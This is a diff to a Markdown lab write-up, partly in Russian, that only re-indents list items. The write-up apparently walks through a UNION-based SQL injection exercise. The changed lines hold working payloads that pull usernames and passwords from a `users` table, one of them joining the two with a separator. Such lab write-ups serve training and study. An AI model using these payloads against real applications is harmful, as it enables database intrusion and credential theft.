@@ -28,12 +28,12 @@ The database contains a different table called `users`, with columns called `use
 
 Значит 2 поле это строка. И теперь 2 варианта:
 1. либо мы выводим логины и пароли отдельно:
-  - ```sql
-    ' UNION SELECT NULL, username FROM users--
-    ```
-  - ```sql
-    ' UNION SELECT NULL, password FROM users--
-    ```
+   - ```sql
+     ' UNION SELECT NULL, username FROM users--
+     ```
+   - ```sql
+     ' UNION SELECT NULL, password FROM users--
+     ```
 2. либо делаем по уму через конкатенацию с разделителем:
    ```sql
    ' UNION SELECT NULL, username||':'||password FROM users--
